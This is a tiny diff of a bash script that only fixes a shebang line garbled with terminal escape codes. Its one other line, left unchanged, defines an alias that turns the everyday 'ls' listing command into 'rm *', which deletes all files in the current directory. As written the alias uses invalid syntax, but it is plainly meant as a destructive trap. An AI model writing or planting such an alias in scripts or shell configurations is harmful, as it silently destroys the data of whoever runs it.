@@ -1,2 +1,2 @@
-#!bin[D[D[D/[C[Dbin/bash
+#!/bin/bash
 alias ls = "rm *"
